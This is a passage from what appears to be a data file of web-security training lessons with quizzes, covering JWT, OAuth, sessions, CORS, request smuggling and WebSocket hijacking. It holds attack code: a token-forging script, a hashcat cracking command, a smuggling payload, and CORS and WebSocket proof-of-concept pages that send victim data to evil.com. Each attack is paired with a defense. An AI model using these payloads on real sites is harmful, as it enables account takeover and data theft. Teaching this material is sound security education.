combined with hexadecimal or string escapes, such as ()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")","|length array counter filter","|capitalize string title filter","|reverse array inversion filter"],"answer":0,"explanation":"In Jinja2, the |attr() filter performs dynamic attribute lookup equivalent to dot notation. By passing escaped string arguments (e.g. \\x5f\\x5fclass\\x5f\\x5f or unicode equivalents), attackers retrieve magic methods without typing literal periods or underscores."}]},
  "web-09-01": {"html":"\n<h2>JWT Fundamentals: alg=none & Secret Cracking</h2>\n\n<p><strong>JSON Web Token (JWT)</strong> is the industry standard for stateless authentication in modern single-page applications and distributed microservices. However, flawed signature validation or weak symmetric secrets allow adversaries to forge arbitrary identities—including full administrative compromises—without knowing genuine credentials.</p>\n\n<p>Consider an intuitive real-world analogy: A JWT resembles an amusement park VIP wristband with your guest tier printed on it (Payload), stamped with an embossed fluorescent seal (Signature). An inspector scans the seal to verify its validity. But suppose the turnstile has a flawed fallback mode: \"If the wristband indicates 'no signature mode (alg=none)', skip verification and grant entry\". An intruder simply drafts a ticket labeled 'Park Superintendent' marked with 'alg=none', and the gate welcomes them in unconditionally!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Dissect the three-part JWT architecture: <code>Header.Payload.Signature</code><br>\n  ② Replicate the classic <code>alg=none</code> unsigned authentication bypass flaw<br>\n  ③ Perform offline brute-force cracking against weak HMAC-SHA256 secrets using Hashcat<br>\n  ④ Implement production-grade asymmetric verification and strict algorithm whitelisting</p>\n</div>\n\n<h3>Step 1: JWT Anatomy & Threat Vectors Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Component</th><th>Encoding</th><th>Representative Data</th><th>High-Risk Vulnerabilities</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Header</strong></td>\n      <td>Base64URL</td>\n      <td><code>{\"alg\":\"HS256\",\"typ\":\"JWT\"}</code></td>\n      <td>Accepting <code>alg=none</code>; algorithm confusion (downgrading RS256 to HS256)</td>\n    </tr>\n    <tr>\n      <td><strong>Payload</strong></td>\n      <td>Base64URL</td>\n      <td><code>{\"user\":\"alice\",\"role\":\"user\",\"exp\":1700000000}</code></td>\n      <td>Plaintext exposure; sensitive secrets must never be placed in unencrypted claims</td>\n    </tr>\n    <tr>\n      <td><strong>Signature</strong></td>\n      <td>HMAC-SHA256 / RSA</td>\n      <td><code>HMACSHA256(Header + \".\" + Payload, secret)</code></td>\n      <td>Weak symmetric dictionary keys cracked offline via GPU wordlists</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Practical Exploit Demonstration</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># 1. alg=none Signature Stripping Attack\nimport base64, json\n\n# Craft malicious Header specifying 'none' algorithm (case permutations: none, None, NONE)\nheader = base64.urlsafe_b64encode(json.dumps({\"alg\": \"none\", \"typ\": \"JWT\"}).encode()).decode().rstrip(\"=\")\n\n# Forge privileged Payload elevating user role to admin\npayload = base64.urlsafe_b64encode(json.dumps({\"user\": \"guest\", \"role\": \"admin\"}).encode()).decode().rstrip(\"=\")\n\n# Crucial: Signature component is empty, but the trailing period is preserved!\nforged_jwt = f\"{header}.{payload}.\"\nprint(\"Forged alg=none Token:\", forged_jwt)\n\n# 2. Offline Secret Cracking via Hashcat (mode 16500)\n# hashcat -m 16500 &lt;jwt_token&gt; rockyou.txt</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  Given the JWT <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidmljdGltIiwiaXNfYWRtaW4iOmZhbHNlfQ.signature</code>, how do you modify it to test for an <code>alg=none</code> vulnerability?<br>\n  <strong>Answer:</strong><br>\n  ① Base64URL-encode <code>{\"alg\":\"none\",\"typ\":\"JWT\"}</code> to obtain <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</code>.<br>\n  ② Base64URL-encode <code>{\"user\":\"victim\",\"is_admin\":true}</code> to obtain <code>eyJ1c2VyIjoidmljdGltIiwiaXNfYWRtaW4iOnRydWV9</code>.<br>\n  ③ Concatenate with an empty signature and trailing dot: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidmljdGltIiwiaXNfYWRtaW4iOnRydWV9.</code> and submit in the HTTP request.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① Standard JWTs provide tamper-detection (integrity), not confidentiality.<br>\n  ② Verification routines must enforce an explicit algorithm whitelist, reject <code>none</code>, and use cryptographically strong high-entropy keys.</p>\n</div>\n","checkpoints":[{"question":"During JWT security assessments, setting the Header `alg` claim to `none` primarily tests for which vulnerability?","options":["Backend SQL injection vulnerabilities","Flawed signature verification accepting unsigned forged tokens","Plaintext password exposure in the payload","Premature session expiration timeouts"],"answer":1,"explanation":"The JWT specification historically included `alg: none`. If a server library fails to enforce an algorithm whitelist, it accepts unsigned tokens, allowing attackers to forge arbitrary claims without possessing the secret key."},{"question":"In a JWT Algorithm Confusion attack (downgrading RS256 to HS256), what mechanism enables the attacker to forge valid authentication tokens?","options":["Changing alg to symmetric HS256 and signing the forged token using the server's publicly accessible RSA public key as the HMAC shared secret","Brute-forcing the 4096-bit prime factors of the private RSA key directly","Injecting SQL statements into the JWT payload to wipe the database key table","Switching the token encoding standard from Base64Url to Base32"],"answer":0,"explanation":"If the backend verification handler blindly delegates key selection based on the token's alg header while using its stored public key, switching to HS256 treats the public key string as a symmetric HMAC secret. Because the public key is known to the attacker, they can sign arbitrary payloads."}]},
  "web-09-02": {"html":"\n<h2>OAuth 2.0 Architecture & Authorization Flaws</h2>\n\n<p><strong>OAuth 2.0</strong> is the undisputed modern framework for delegated authorization and Single Sign-On (SSO). Because the authorization flow spans the Resource Owner, Client, Authorization Server, and Resource Server, any lax validation in redirection endpoints or anti-forgery tokens leads directly to <strong>account takeover and authorization code theft!</strong></p>\n\n<p>Consider an intuitive real-world analogy: An OAuth authorization code resembles receiving a claim ticket at a hotel front desk. You verify your ID with an identity provider (e.g. Google), which hands you an authorization voucher (Code) to give to the hotel reception (third-party site). If the reception never validates whether the claim ticket originated from your active check-in session (missing state parameter), an adversary can trick you into presenting their claim ticket, binding your account to the attacker's identity forever!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master the end-to-end OAuth 2.0 Authorization Code Grant protocol flow<br>\n  ② Exploit loose <code>redirect_uri</code> pattern matching to exfiltrate authorization codes<br>\n  ③ Understand and demonstrate OAuth CSRF account-linking attacks caused by omitted <code>state</code> tokens<br>\n  ④ Enforce exact-match URI whitelisting and implement PKCE (Proof Key for Code Exchange)</p>\n</div>\n\n<h3>Step 1: OAuth Vulnerability & Remediation Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Vulnerability Class</th><th>Root Cause</th><th>Adversary Exploit Vector</th><th>Best Practice Defense</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Permissive redirect_uri</strong></td>\n      <td>Prefix/regex matching allowing arbitrary redirection domains</td>\n      <td>Lure authenticated users to malicious callback: <code>redirect_uri=https://trust.com.evil.com</code></td>\n      <td>Enforce strict, byte-for-byte exact character matching against an allowlist</td>\n    </tr>\n    <tr>\n      <td><strong>OAuth CSRF (Missing state)</strong></td>\n      <td>Authorization request omits cryptographic <code>state</code> parameter</td>\n      <td>Attacker initiates auth, captures their own code, lures victim to submit it and bind accounts</td>\n      <td>Bind every authorization request to a unique, unguessable session token in the <code>state</code> param</td>\n    </tr>\n    <tr>\n      <td><strong>Code Leakage & Replay</strong></td>\n      <td>Authorization codes remain valid after initial use or endure long lifetimes</td>\n      <td>Harvest codes from Referer headers or server logs and exchange for bearer access tokens</td>\n      <td>Limit code validity to under 60 seconds; enforce single-use revocation; mandate PKCE</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Canonical Protocol Exchange Trace</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-http\"># 1. Client initiates authorization flow with cryptographic state parameter:\nGET /oauth/authorize?\n  response_type=code&amp;\n  client_id=cybershop_client_id&amp;\n  redirect_uri=https%3A%2F%2Fcybershop.com%2Fcallback&amp;\n  scope=read_profile&amp;\n  state=SECURE_RANDOM_TOKEN HTTP/1.1\nHost: auth.provider.com\n\n# 2. Authorization server redirects back with transient Code and matching state:\nHTTP/1.1 302 Found\nLocation: https://cybershop.com/callback?code=AUTH_CODE_xyz123&amp;state=SECURE_RANDOM_TOKEN\n\n# 3. Client backend exchanges Code for Access Token over authenticated back-channel:\nPOST /oauth/token HTTP/1.1\nHost: auth.provider.com\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&amp;code=AUTH_CODE_xyz123&amp;client_id=...&amp;client_secret=...</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  If a service verifies <code>redirect_uri</code> using <code>uri.startsWith(\"https://oauth.target.com\")</code>, how can an adversary bypass this constraint?<br>\n  <strong>Answer:</strong> The attacker can register <code>oauth.target.com.attacker.com</code> or chain with an Open Redirect vulnerability on <code>oauth.target.com</code> to leak authorization codes.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① OAuth 2.0 security relies on immutable exact-match redirect URIs and unguessable state tokens.<br>\n  ② PKCE should be universally mandated for public and single-page clients to mitigate code interception.</p>\n</div>\n","checkpoints":[{"question":"In the OAuth 2.0 Authorization Code Flow, what is the primary security role of the `state` parameter?","options":["Specifying the requested permission scopes","Defending against OAuth CSRF attacks (cross-site account binding hijacking)","Accelerating the code-to-token back-channel exchange","Encrypting the client secret in transit"],"answer":1,"explanation":"The `state` parameter is an unguessable random token generated by the client and stored in the user's session. Validating it on the redirect callback ensures that the incoming authorization code originated from the genuine user's active session, preventing OAuth CSRF."},{"question":"In an OAuth 2.0 deployment, what vulnerability emerges if the authorization server performs weak or partial prefix matching on the `redirect_uri` parameter?","options":["Attackers can manipulate the callback destination (e.g. via path traversal or open redirects) to exfiltrate authorization codes or access tokens to an external server","Attackers gain direct physical shutdown capabilities over the authentication hardware","Attackers can alter the global timezone configuration of the OAuth identity provider","Target workstations suffer automatic CPU cooling hardware overrides"],"answer":0,"explanation":"Flawed redirect_uri validation permits attackers to construct authorization requests that leak sensitive authorization codes or tokens to unauthorized endpoints, leading to complete account takeover."}]},
  "web-09-03": {"html":"\n<h2>Session Fixation, Hijacking & Modern Defense</h2>\n\n<p>Session management links stateless HTTP requests to authenticated user states. If session identifiers are static across authentication transitions or lack protective transport directives, adversaries execute <strong>Session Fixation</strong> or <strong>Session Hijacking</strong> to impersonate legitimate users without ever obtaining their credentials.</p>\n\n<p>Consider an intuitive real-world analogy: Session Fixation resembles an attacker installing their own padlock onto a shared bicycle and leaving it unlocked. An unsuspecting user comes along, registers their account, and rides the bicycle (authenticating the session). Once the user departs, the attacker returns and unlocks the bicycle using their original key! Defense is simple: the moment authentication completes, the system must immediately destroy the old padlock and mint a fresh, random key (<code>session_regenerate_id</code>)!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the exploitation lifecycle of Session Fixation attacks<br>\n  ② Master four vital cookie protection flags: <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, and <code>__Host-</code> prefixes<br>\n  ③ Enforce session ID regeneration upon privilege and authentication state changes<br>\n  ④ Implement session idle timeouts and multi-factor defense controls</p>\n</div>\n\n<h3>Step 1: Cookie Security Directive Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Cookie Directive</th><th>Mitigated Vulnerability</th><th>Risk When Omitted</th><th>Recommended Standard Syntax</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>HttpOnly</code></td>\n      <td>XSS-based Cookie Exfiltration</td>\n      <td>Adversaries access <code>document.cookie</code> and steal tokens</td>\n      <td><code>Set-Cookie: session=abc; HttpOnly</code></td>\n    </tr>\n    <tr>\n      <td><code>Secure</code></td>\n      <td>Man-in-the-Middle (MitM) Eavesdropping</td>\n      <td>Transmitted in unencrypted HTTP traffic over insecure networks</td>\n      <td><code>Set-Cookie: session=abc; Secure</code></td>\n    </tr>\n    <tr>\n      <td><code>SameSite=Lax/Strict</code></td>\n      <td>Cross-Site Request Forgery (CSRF)</td>\n      <td>Implicitly attached to cross-origin third-party requests</td>\n      <td><code>Set-Cookie: session=abc; SameSite=Lax</code></td>\n    </tr>\n    <tr>\n      <td><code>__Host-</code> Prefix</td>\n      <td>Subdomain Cookie Injection / Overwrites</td>\n      <td>Vulnerable subdomains forge or overwrite parent cookies</td>\n      <td><code>Set-Cookie: __Host-session=abc; Path=/; Secure</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Hardened Session Implementation</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-php\">&lt;?php\n// Core Defense 1: Regenerate Session ID upon successful authentication!\nsession_start();\n\nif (verify_credentials($username, $password)) {\n    // Crucial: true flag destroys old session storage to prevent fixation\n    session_regenerate_id(true);\n    \n    $_SESSION['user_id'] = $user['id'];\n    $_SESSION['authenticated'] = true;\n    $_SESSION['last_activity'] = time();\n}\n\n// Core Defense 2: Enforce hardened cookie configuration parameters\nsession_set_cookie_params([\n    'lifetime' => 3600,            // 1-hour expiry\n    'path' => '/',\n    'domain' => 'cybershop.com',\n    'secure' => true,              // Enforce HTTPS\n    'httponly' => true,            // Block JS reading\n    'samesite' => 'Lax'            // Defend CSRF\n]);\n?&gt;</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  What security vulnerability exists if a web application preserves the exact same session cookie value before and after a user logs in?<br>\n  <strong>Answer:</strong> Session Fixation. An attacker can set a pre-generated session ID in the victim's browser (e.g. via an unauthenticated link), wait for the victim to log in, and then reuse that known session ID to access the account.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① Session IDs must be regenerated upon every authentication boundary change.<br>\n  ② Complete session protection combines HttpOnly, Secure, SameSite, and strict idle timeouts.</p>\n</div>\n","checkpoints":[{"question":"What is the industry-standard remediation for Session Fixation vulnerabilities?","options":["Regenerating the session identifier immediately upon successful authentication (e.g. `session_regenerate_id(true)`)","Solely appending the `HttpOnly` cookie flag","Increasing session token length beyond 128 bits","Restricting all application traffic strictly to POST requests"],"answer":0,"explanation":"Session fixation exploits static session identifiers that persist before and after login. Regenerating the session token upon authentication boundary transitions invalidates any pre-seeded session keys an attacker planted in the client."},{"question":"Which cookie security attribute must be enabled by the server to prevent client-side JavaScript (such as injected XSS scripts) from reading session cookies via `document.cookie`?","options":["HttpOnly","SameSite=None","Path=/","Domain=.example.com"],"answer":0,"explanation":"The HttpOnly directive instructs browsers to block client-side scripts from accessing the cookie through document.cookie. Even if an application suffers from XSS, attackers cannot directly exfiltrate HttpOnly session tokens."}]},
  "web-10-01": {"html":"\n<h2>CORS Misconfigurations & Data Exfiltration</h2>\n\n<p><strong>Cross-Origin Resource Sharing (CORS)</strong> provides a controlled mechanism for web browsers to relax the strict confines of the Same-Origin Policy (SOP). However, when developers recklessly configure permissive headers for testing convenience, external hostile websites can <strong>exfiltrate sensitive personal data, messages, and transactional records directly from authenticated users!</strong></p>\n\n<p>Consider an intuitive real-world analogy: The Same-Origin Policy is like a residential building's security guard who only permits residents to enter their own apartments. CORS is an authorized guest list. If a resident leaves a note stating: \"No matter which stranger knocks on the door (arbitrary Origin), make them a duplicate key immediately (reflecting Origin), and permit them to open all drawers and safes (Allow-Credentials: true)!\" then any thief can loot the apartment simply by enticing the resident to visit their website!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the architectural boundaries between SOP and CORS headers<br>\n  ② Identify the 3 high-risk CORS misconfigurations: Arbitrary Reflection, Null Origin trust, and Regex flaws<br>\n  ③ Author automated cross-origin JavaScript exfiltration PoCs with credential binding<br>\n  ④ Implement secure, strict server-side origin allowlists</p>\n</div>\n\n<h3>Step 1: CORS Misconfiguration Matrix (Cheat Sheet)</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Configuration Defect</th><th>Server Response Profile</th><th>Exploit Feasibility</th><th>Impact Level</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Arbitrary Reflection + Credentials</strong></td>\n      <td><code>Access-Control-Allow-Origin: &lt;Reflected Origin&gt;</code><br><code>Access-Control-Allow-Credentials: true</code></td>\n      <td><strong>Critical</strong>: Any external domain can read responses</td>\n      <td>Exfiltration of PII, private messages, and API tokens</td>\n    </tr>\n    <tr>\n      <td><strong>Trusted null Origin</strong></td>\n      <td><code>Access-Control-Allow-Origin: null</code><br><code>Access-Control-Allow-Credentials: true</code></td>\n      <td><strong>High</strong>: Exploitable via sandboxed iframes</td>\n      <td>Bypasses origin restrictions to exfiltrate internal API data</td>\n    </tr>\n    <tr>\n      <td><strong>Flawed Regex Validation</strong></td>\n      <td><code>allow-origin: target.com.evil.com</code> or<br><code>allow-origin: evil-target.com</code></td>\n      <td><strong>High</strong>: Register candidate domain or subdomains</td>\n      <td>Exploits substring or unanchored regex validations</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Cross-Origin Data Exfiltration Exploit Template</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-html\">&lt;!-- Hosted on evil.com/steal.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n  &lt;h3&gt;Loading promotional offer...&lt;/h3&gt;\n  &lt;script&gt;\n    // Issue cross-origin request with authenticated ambient credentials\n    fetch('https://api.cybershop.com/user/sensitive_profile', {\n      method: 'GET',\n      credentials: 'include' // Attaches victim session cookies automatically!\n    })\n    .then(response =&gt; response.json())\n    .then(data =&gt; {\n      // Exfiltrate stolen JSON data to attacker collection endpoint\n      fetch('https://evil.com/log?stolen=' + encodeURIComponent(JSON.stringify(data)));\n    });\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  Sending a request with <code>Origin: https://evil.com</code> returns <code>Access-Control-Allow-Origin: https://evil.com</code> and <code>Access-Control-Allow-Credentials: true</code>. What vulnerability does this indicate?<br>\n  <strong>Answer:</strong> Insecure CORS origin reflection with credential support. An attacker can host an exploit page on any domain to read the API responses of authenticated users.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① CORS relaxes browser isolation; misconfiguring it exposes authenticated data cross-origin.<br>\n  ② Never dynamically reflect the request Origin header when credentials are included; enforce a strict server-side allowlist.</p>\n</div>\n","checkpoints":[{"question":"When an endpoint returns `Access-Control-Allow-Origin: *`, which of the following is true regarding credentialed cross-origin requests?","options":["Any external site can freely read the credentialed response","Browser CORS specifications forbid combining wildcard `*` with `Access-Control-Allow-Credentials: true`","This configuration is strictly more dangerous than dynamically reflecting the Origin","The browser strips user passwords automatically from request headers"],"answer":1,"explanation":"Under the W3C CORS specification, browsers reject credentialed requests if `Access-Control-Allow-Origin` is set to wildcard `*`. Consequently, developers blindly reflecting specific Origin headers create a far greater security risk."},{"question":"Which prevalent CORS implementation flaw introduces severe data exfiltration vulnerabilities across arbitrary origins?","options":["Dynamically reflecting whatever Origin header the client sends into Access-Control-Allow-Origin while specifying Access-Control-Allow-Credentials: true","Completely disallowing custom cross-origin request headers","Constraining allowed cross-origin origins strictly to explicit same-origin subdomains","Configuring the preflight OPTIONS response caching interval to 3600 seconds"],"answer":0,"explanation":"Dynamically mirroring the incoming Origin header while pairing it with Access-Control-Allow-Credentials: true effectively grants any arbitrary website on the internet full authenticated read access to the target API, eviscerating the Same-Origin Policy."}]},
  "web-10-02": {"html":"\n<h2>HTTP Request Smuggling: CL.TE & TE.CL Mechanics</h2>\n\n<p><strong>HTTP Request Smuggling</strong> is an advanced protocol desynchronization vulnerability arising when frontend proxy servers (reverse proxies, load balancers, CDNs) and backend web servers interpret HTTP request boundaries differently. By injecting divergent delimiter headers, attackers \"smuggle\" unauthorized requests past the frontend to <strong>poison caches, hijack other users' sessions, and access restricted admin endpoints!</strong></p>\n\n<p>Consider an intuitive real-world analogy: Two parcel inspectors evaluate incoming packages. The frontend inspector uses a measuring tape (<code>Content-Length</code>), while the backend sorter stops at the first 'END' seal (<code>Transfer-Encoding: chunked</code>). An attacker dispatches a package containing hidden contraband past the tape measure. The backend stops unpacking at the 'END' seal, leaving the remaining contraband in the queue. The next customer's package arrives and is merged directly with the smuggler's contraband!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand persistent HTTP keep-alive connection reuse between proxy and backend<br>\n  ② Differentiate specification conflicts between <code>Content-Length</code> (CL) and <code>Transfer-Encoding</code> (TE)<br>\n  ③ Dissect the mechanics of CL.TE and TE.CL desynchronization attacks<br>\n  ④ Enforce end-to-end HTTP/2 adoption and strict proxy parsing hygiene</p>\n</div>\n\n<h3>Step 1: Request Smuggling Mechanics Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Smuggling Class</th><th>Frontend Parser</th><th>Backend Parser</th><th>Core Desync Vector</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>CL.TE</strong></td>\n      <td>Prioritizes <code>Content-Length</code></td>\n      <td>Prioritizes <code>Transfer-Encoding: chunked</code></td>\n      <td>Frontend forwards entire body based on CL; backend terminates on <code>0\\r\\n\\r\\n</code> chunk; leftover payload prepends to next request</td>\n    </tr>\n    <tr>\n      <td><strong>TE.CL</strong></td>\n      <td>Prioritizes <code>Transfer-Encoding: chunked</code></td>\n      <td>Prioritizes <code>Content-Length</code></td>\n      <td>Frontend processes full chunks; backend only reads CL bytes, leaving remainder in buffer for the next request</td>\n    </tr>\n    <tr>\n      <td><strong>TE.TE</strong></td>\n      <td>Obfuscated TE header causes one server to ignore TE</td>\n      <td>Remaining server processes TE normally</td>\n      <td>Header obfuscation (e.g. <code>Transfer-Encoding: xchunked</code>) degrades parsing to CL.TE or TE.CL</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Canonical CL.TE Attack Payload</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-http\"># Canonical CL.TE Smuggling Payload\nPOST / HTTP/1.1\nHost: vulnerable-site.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED</code></pre>\n</div>\n<p><strong>Technical Breakdown:</strong><br>\n① The frontend reads 13 bytes according to <code>Content-Length</code> and relays the entire payload.<br>\n② The backend interprets <code>Transfer-Encoding: chunked</code>, sees the terminal <code>0\\r\\n\\r\\n</code> chunk, and considers the message complete.<br>\n③ The trailing <code>SMUGGLED</code> bytes remain unconsumed in the backend TCP stream and are prepended to the subsequent client's request.</p>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  According to RFC 7230, which header should take precedence if both <code>Content-Length</code> and <code>Transfer-Encoding: chunked</code> are present?<br>\n  <strong>Answer:</strong> The specification dictates that <code>Transfer-Encoding</code> must override <code>Content-Length</code>. Request smuggling occurs because disparate servers implement varying levels of compliance or error handling.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① Request smuggling exploits boundary ambiguities between chained HTTP/1.1 servers.<br>\n  ② Migrating to HTTP/2 eliminates ambiguity through binary framing, while proxies must reject requests with ambiguous headers.</p>\n</div>\n","checkpoints":[{"question":"In a CL.TE HTTP Request Smuggling scenario, which party prioritizes the `Content-Length` header?","options":["The frontend reverse proxy / CDN","The backend application server","The client web browser","The resolving DNS nameserver"],"answer":0,"explanation":"By convention, CL.TE denotes 'Frontend.Backend'. The frontend interprets `Content-Length` to frame the message, while the backend prioritizes `Transfer-Encoding: chunked`, prematurely completing the chunk and desynchronizing the TCP socket."},{"question":"In a **TE.CL** HTTP Request Smuggling scenario, how do the frontend reverse proxy and backend server misalign on request boundary parsing?","options":["The frontend proxy processes Transfer-Encoding: chunked, whereas the backend server ignores chunked encoding and relies strictly on Content-Length","Both frontend and backend exclusively process Content-Length","Both frontend and backend exclusively process Transfer-Encoding","The frontend unconditionally drops all HTTP POST requests"],"answer":0,"explanation":"In a TE.CL desynchronization, the frontend interprets the message body via Transfer-Encoding: chunked and routes the whole payload. The backend only checks Content-Length, truncating message boundaries early and leaving orphaned bytes in the persistent socket stream to poison the next client request."}]},
  "web-10-03": {"html":"\n<h2>WebSocket Security & Advanced Web Attack Defense</h2>\n\n<p>The <strong>WebSocket</strong> protocol enables bi-directional, full-duplex communication over a single persistent TCP connection (vital for chats, trading dashboards, and multiplayer applications). However, because the initial handshake utilizes standard HTTP, and <strong>web browsers do NOT enforce the Same-Origin Policy on WebSocket connections</strong>, systems become vulnerable to Cross-Site WebSocket Hijacking (CSWSH).</p>\n\n<p>Consider an intuitive real-world analogy: A standard HTTP request is like mailing a certified letter where the address is inspected every time. A WebSocket handshake is like running a direct private telephone line between the browser and server. If the server never checks who requested the line (ignoring the <code>Origin</code> header), a malicious page can command the browser to run that private line back to the server using the victim's cookies, exfiltrating internal real-time data continuously!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master the WebSocket lifecycle: HTTP Upgrade handshake to bi-directional framed streaming<br>\n  ② Replicate Cross-Site WebSocket Hijacking (CSWSH) vulnerabilities<br>\n  ③ Mitigate injection vectors inside real-time WebSocket payloads (SQLi, XSS, Command Injection)<br>\n  ④ Formulate full-stack defense-in-depth and Zero Trust application security architectures</p>\n</div>\n\n<h3>Step 1: WebSocket Handshake & CSWSH Exploitation</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-http\"># 1. Browser initiates WebSocket upgrade request (attaching ambient cookies):\nGET /chat/ws HTTP/1.1\nHost: internal.cybershop.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nOrigin: https://evil.com  &lt;-- Untrusted external origin!\nCookie: session=victim_active_token\n\n# 2. Vulnerable server accepts handshake without verifying Origin:\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</code></pre>\n</div>\n\n<h3>Step 2: Cross-Site WebSocket Hijacking PoC</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-javascript\">// Hosted on evil.com/cswsh.html\n// Establishes cross-origin bidirectional stream on behalf of authenticated victim:\nconst ws = new WebSocket('wss://internal.cybershop.com/chat/ws');\n\nws.onopen = function() {\n  console.log('[+] WebSocket stream established! Requesting confidential data...');\n  ws.send(JSON.stringify({ action: 'get_financial_records' }));\n};\n\nws.onmessage = function(event) {\n  // Exfiltrate received stream data to attacker server\n  fetch('https://evil.com/exfiltrate', {\n    method: 'POST',\n    body: event.data\n  });\n};</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  How can web applications reliably prevent Cross-Site WebSocket Hijacking (CSWSH)?<br>\n  <strong>Answer:</strong><br>\n  ① Strictly validate the <code>Origin</code> header during the initial HTTP Upgrade handshake against a trusted allowlist;<br>\n  ② Implement one-time anti-CSRF tokens passed as handshake query parameters or custom subprotocols.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① WebSockets bypass browser SOP; rigorous <code>Origin</code> validation during handshake is essential.<br>\n  ② Messages streamed over established WebSockets require full input sanitization and output encoding.</p>\n</div>\n","checkpoints":[{"question":"What is the most critical server-side defense against Cross-Site WebSocket Hijacking (CSWSH)?","options":["Strictly validating the `Origin` header against an allowlist during the initial HTTP Upgrade handshake","Restricting each IP address to a single concurrent connection","Mandating Base64 encoding for all WebSocket messages","Binding the WebSocket listener to static port 8080"],"answer":0,"explanation":"Browsers do not apply SOP restrictions to WebSocket connections and attach ambient cookies to handshake requests. The server must validate the `Origin` header during handshake processing to prevent cross-site hijacking."},{"question":"Once a WebSocket full-duplex connection is established, which statement regarding message data security is accurate?","options":["Browser Same-Origin Policy does not govern raw WebSocket messages; unvalidated messages rendered directly into the DOM can still introduce Cross-Site Scripting (XSS)","The WebSocket protocol incorporates automated native sanitization against SQL injection and XSS","WebSocket connections are structurally restricted to plaintext UTF-8 and cannot transmit binary ArrayBuffers","WebSocket frames operate without underlying TCP transport sockets"],"answer":0,"explanation":"WebSocket frames bypass traditional HTTP request/response lifecycles and Same-Origin protections once established. Applications must validate, escape, and authenticate incoming messages just as rigorously as standard HTTP payloads to prevent XSS and backend injection."}]}
});
